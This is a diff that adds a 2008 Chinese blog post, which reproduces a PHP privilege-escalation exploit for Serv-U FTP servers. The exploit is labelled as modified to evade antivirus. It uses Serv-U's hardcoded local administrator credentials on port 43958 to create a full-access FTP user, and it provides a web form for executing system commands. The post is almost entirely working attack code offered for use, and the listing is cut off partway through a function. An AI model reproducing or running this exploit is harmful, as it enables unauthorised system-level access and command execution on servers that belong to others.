@@ -77,6 +77,712 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-posts-2008-01-16-178-html" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/posts/20080116-178.html" class="article-date">
+  <time class="dt-published" datetime="2008-01-15T16:00:00.000Z" itemprop="datePublished">2008-01-16</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/">服务器</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/posts/20080116-178.html">Serv-U All Version本地提升权限Exp10it Ver 1.5</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <div class="codeText">
+  <div class="codeHead">
+    PHP代码
+  </div>
+  
+  <ol class="dp-c" start="1">
+    <li class="alt">
+      <span><span><?PHP&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="">
+      <span><span class="comment">/**</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="comment">修改免杀版本&nbsp;BY：CiKer</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="comment">**/</span><span>&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="alt">
+      <span><span class="comment">//</span><span>&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="">
+      <span><span class="comment">//Codez&nbsp;begin</span><span>&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="alt">
+      <span><span class="comment">//</span><span>&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="">
+      <span><span class="comment">//判断magic_quotes_gpc的值</span><span>&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="alt">
+      <span>&nbsp;&nbsp;</span>
+    </li>
+    <li class="">
+      <span>set_time_limit(0);&nbsp;&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span>&nbsp;&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="keyword">if</span><span>&nbsp;(get_magic_quotes_gpc())&nbsp;{&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="alt">
+      <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="vars">$_GET</span><span>&nbsp;=&nbsp;stripslashes_array(</span><span class="vars">$_GET</span><span>);&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="">
+      <span>}&nbsp;&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span>&nbsp;&nbsp;</span>
+    </li>
+    <li class="">
+      <span>&nbsp;&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="comment">//变量初始化</span><span>&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="">
+      <span><span class="vars">$addr</span><span>&nbsp;=&nbsp;</span><span class="string">&#8216;127.0.0.1&#8217;</span><span>;&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="alt">
+      <span><span class="vars">$ftpport</span><span>&nbsp;=&nbsp;21;&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="">
+      <span><span class="vars">$adminport</span><span>&nbsp;=&nbsp;43958;&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="alt">
+      <span><span class="vars">$adminuser</span><span>&nbsp;=&nbsp;</span><span class="string">&#8216;LocalAdministrator&#8217;</span><span>;&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="">
+      <span><span class="vars">$adminpass</span><span>&nbsp;=&nbsp;</span><span class="string">&#8216;#l@$ak#.lk;0@P&#8217;</span><span>;&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="alt">
+      <span><span class="vars">$user</span><span>&nbsp;=&nbsp;</span><span class="string">&#8216;110&#8217;</span><span>;&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="">
+      <span><span class="vars">$password</span><span>&nbsp;=&nbsp;</span><span class="string">&#8216;110&#8217;</span><span>;&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="alt">
+      <span><span class="vars">$homedir</span><span>&nbsp;=&nbsp;</span><span class="string">&#8216;C:\\';</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">$dir&nbsp;=&nbsp;&#8216;</span><span>C:\\WINNT\\System32\\</span><span class="string">&#8216;;</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">//有改变则赋值</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">if&nbsp;($_GET){</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$addr&nbsp;=&nbsp;$_GET['</span><span>addr</span><span class="string">']&nbsp;;&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="">
+      <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ftpport&nbsp;=&nbsp;$_GET['<span>ftpport</span><span class="string">']&nbsp;;</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$adminport&nbsp;=&nbsp;$_GET['</span><span>adminport</span><span class="string">']&nbsp;;&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="">
+      <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$adminuser&nbsp;=&nbsp;$_GET['<span>adminuser</span><span class="string">']&nbsp;;</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$adminpass&nbsp;=&nbsp;$_GET['</span><span>adminpass</span><span class="string">']&nbsp;;&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="">
+      <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$user&nbsp;=&nbsp;$_GET['<span>user</span><span class="string">']&nbsp;;</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$password&nbsp;=&nbsp;$_GET['</span><span>password</span><span class="string">']&nbsp;;&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="">
+      <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$homedir&nbsp;=&nbsp;$_GET['<span>homedir</span><span class="string">']&nbsp;;</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($_GET['</span><span>dir</span><span class="string">']){&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="">
+      <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$dir&nbsp;=&nbsp;$_GET['<span>dir</span><span class="string">']&nbsp;;</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">}</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">?></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><!&#8211;&nbsp;主文件开始&nbsp;//&#8211;></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><html></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><head></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><title>-=<Serv-U&nbsp;All&nbsp;Version本地提升权限Exp10it&nbsp;Ver&nbsp;1.5>=-</title></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><meta&nbsp;content="text/html;&nbsp;charset=gb2312"&nbsp;http-equiv="Content-Type"></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><STYLE&nbsp;TYPE="text/css"></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">b&nbsp;{font-family&nbsp;:&nbsp;Verdana,&nbsp;sans-serif;font-size&nbsp;:&nbsp;14px;}</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">body,td,p,pre&nbsp;{</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">font-family&nbsp;:&nbsp;Verdana,&nbsp;sans-serif;font-size&nbsp;:&nbsp;12px;</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">}</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">input&nbsp;{</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;font-family:&nbsp;"Verdana";</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;font-size:&nbsp;"11px";</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BACKGROUND-COLOR:&nbsp;"#FFFFFF";</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;height:&nbsp;"18px";</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;border:&nbsp;"1px&nbsp;solid&nbsp;#666666";</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"></STYLE></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"></head></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><body&nbsp;bgcolor="#EEEEEE"&nbsp;text="#000000"&nbsp;link="#006699"&nbsp;vlink="#5493B4"></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><center><b>Serv-U&nbsp;All&nbsp;Version本地提升权限Exp10it&nbsp;Ver&nbsp;1.5</b></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><br><br></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><b>添加Serv-U用户部分</b></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><br></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><form&nbsp;action="<?=$_SERVER['</span><span>PHP_SELF</span><span class="string">']?>"&nbsp;method="get"></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><table&nbsp;width="660"&nbsp;border="0"&nbsp;cellpadding="0"></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><tr><td&nbsp;width="300"&nbsp;align="center">主机IP：</td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<td&nbsp;width="360"&nbsp;align="center"><input&nbsp;name="addr"&nbsp;type="text"&nbsp;class="INPUT"&nbsp;value="<?=$addr?>"></td></tr></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><tr><td&nbsp;width="300"&nbsp;align="center">主机Ftp端口：</td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<td&nbsp;width="360"&nbsp;align="center"><input&nbsp;name="ftpport"&nbsp;type="text"&nbsp;class="INPUT"&nbsp;value="<?=$ftpport?>"></td></tr></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><tr><td&nbsp;width="300"&nbsp;align="center">主机Ftp管理端口：</td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<td&nbsp;width="360"&nbsp;align="center"><input&nbsp;name="adminport"&nbsp;type="text"&nbsp;class="INPUT"&nbsp;value="<?=$adminport?>"></td></tr></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><tr><td&nbsp;width="300"&nbsp;align="center">主机Ftp管理用户：</td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<td&nbsp;width="360"&nbsp;align="center"><input&nbsp;name="adminuser"&nbsp;type="text"&nbsp;class="INPUT"&nbsp;value="<?=$adminuser?>"></td></tr></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><tr><td&nbsp;width="300"&nbsp;align="center">主机Ftp管理密码：</td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<td&nbsp;width="360"&nbsp;align="center"><input&nbsp;name="adminpass"&nbsp;type="text"&nbsp;class="INPUT"&nbsp;value="<?=$adminpass?>"></td></tr></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><tr><td&nbsp;width="300"&nbsp;align="center">添加的用户名：</td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<td&nbsp;width="360"&nbsp;align="center"><input&nbsp;name="user"&nbsp;type="text"&nbsp;class="INPUT"&nbsp;value="<?=$user?>"></td></tr></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><tr><td&nbsp;width="300"&nbsp;align="center">添加的用户名密码：</td><td&nbsp;width="360"&nbsp;align="center"><input&nbsp;name="password"&nbsp;type="password"&nbsp;class="INPUT"&nbsp;value="<?=$password?>"></td></tr></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><tr><td&nbsp;width="300"&nbsp;align="center">用户主目录(别忘了写"\")：</td>&nbsp;<td&nbsp;width="360"&nbsp;align="center"><input&nbsp;name="homedir"&nbsp;type="text"&nbsp;class="INPUT"&nbsp;value="<?=$homedir?>"></td></tr></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><tr><td&nbsp;width="300"&nbsp;align="center"><input&nbsp;name="action"&nbsp;type="hidden"&nbsp;value="up"></td></tr></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><tr><td&nbsp;width="300"&nbsp;align="center"><input&nbsp;type="submit"&nbsp;class="INPUT"&nbsp;value="添加"></td></tr></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"></form></tr></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"></table></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><hr&nbsp;width="660"><br></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><textarea&nbsp;cols="60"&nbsp;rows="10"&nbsp;readonly>命令回显:</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><?php</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">//添加用户</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">if&nbsp;($_GET['</span><span>action</span><span class="string">']=="up"){</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;up($addr,$ftpport,$adminport,$adminuser,$adminpass,$user,$password,$homedir);</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;?></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"></textarea></center><br><hr&nbsp;width="660"></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><center><b>执行命令部分</b><br></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><form&nbsp;action="<?=$_SERVER['</span><span>PHP_SELF</span><span class="string">']?>"&nbsp;method="get"></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><table&nbsp;width="660"&nbsp;border="0"&nbsp;cellpadding="0"></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><tr><td&nbsp;width="300"&nbsp;align="center">主机Ftp端口：</td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<td&nbsp;width="360"&nbsp;align="center"><input&nbsp;name="ftpport"&nbsp;type="text"&nbsp;class="INPUT"&nbsp;value="<?=$ftpport?>"></td></tr></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><tr><td&nbsp;width="300"&nbsp;align="center">用户名：</td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<td&nbsp;width="360"&nbsp;align="center"><input&nbsp;name="user"&nbsp;type="text"&nbsp;class="INPUT"&nbsp;value="<?=$user?>"></td></tr></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><tr><td&nbsp;width="300"&nbsp;align="center">用户名密码：</td><td&nbsp;width="360"&nbsp;align="center"><input&nbsp;name="password"&nbsp;type="password"&nbsp;class="INPUT"&nbsp;value="<?=$password?>"></td></tr></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><tr><td&nbsp;width="300"&nbsp;align="center">系统路径(别忘了写"\")：</td><td&nbsp;width="360"&nbsp;align="center"><input&nbsp;name="dir"&nbsp;type="text"&nbsp;class="INPUT"&nbsp;value="<?=$dir?>"></td></tr></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><tr><td&nbsp;width="300"&nbsp;align="center">执行的命令：</td>&nbsp;<td&nbsp;width="360"&nbsp;align="center"><input&nbsp;name="cmd"&nbsp;type="text"&nbsp;class="INPUT"&nbsp;value="<?=$_GET['</span><span>cmd</span><span class="string">']?>"></td></tr></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><tr><td&nbsp;width="300"&nbsp;align="center"><input&nbsp;name="action"&nbsp;type="hidden"&nbsp;value="execute"></td></tr></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><tr><td&nbsp;width="300"&nbsp;align="center"><input&nbsp;type="submit"&nbsp;class="INPUT"&nbsp;value="执行"></td></tr></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"></form></tr></table><hr&nbsp;width="660"><br></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><textarea&nbsp;cols="60"&nbsp;rows="10"&nbsp;readonly>命令回显:</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><?php</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">//执行命令</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">if&nbsp;($_GET['</span><span>action</span><span class="string">']=="execute"){&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="">
+      <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ftpcmd($ftpport,$user,$password,$dir,$_GET['<span>cmd</span><span class="string">']);</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">?></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"></textarea></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"></center><br><hr&nbsp;width="660"></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><i><center>Copycenter&nbsp;(C)&nbsp;2004&nbsp;我非我&nbsp;All&nbsp;centers&nbsp;Reserved.&nbsp;免杀修改&nbsp;BY:CiKer&nbsp;从此Hacking的道路更宽敞了&#8230;<br></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"></center></i></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"></body></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"></html></span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string"><!&#8211;&nbsp;主文件结束&nbsp;//&#8211;></span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string"><?php</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">//添加用户主函数定义</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">function&nbsp;up($addr,$ftpport,$adminport,$adminuser,$adminpass,$user,$password,$homedir){</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$fp&nbsp;=&nbsp;fsockopen&nbsp;("127.0.0.1",&nbsp;$adminport,&nbsp;$errno,&nbsp;$errstr,&nbsp;8);</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!$fp)&nbsp;{</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;"$errstr&nbsp;($errno)<br>\n";</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"USER&nbsp;".$adminuser."");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep&nbsp;(1);</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"PASS&nbsp;".$adminpass."");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep&nbsp;(1);</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"SITE&nbsp;MAINTENANCE");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep&nbsp;(1);</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-SETUSERSETUP");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-IP=".$addr."");</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-PortNo=".$ftpport."");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-User=".$user."");</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-Password=".$password."");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-HomeDir=".$homedir."");</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-LoginMesFile=");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-Disable=0");</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-RelPaths=0");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-NeedSecure=0");</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-HideHidden=0");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-AlwaysAllowLogin=0");</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-ChangePassword=1");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-QuotaEnable=0");</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-MaxUsersLoginPerIP=-1");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-SpeedLimitUp=-1");</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-SpeedLimitDown=-1");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-MaxNrUsers=-1");</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-IdleTimeOut=600");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-SessionTimeOut=-1");</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-Expire=0");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-RatioUp=1");</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-RatioDown=1");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-RatiosCredit=0");</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-QuotaCurrent=0");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-QuotaMaximum=0");</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-Maintenance=System");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-PasswordType=Regular");</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"-Ratios=None");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"&nbsp;Access=".$homedir."|RWAMELCDP");</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($fp,&nbsp;"QUIT");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep&nbsp;(1);</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(!feof($fp))&nbsp;{</span>&nbsp;</span>
+    </li>
+    <li class="">
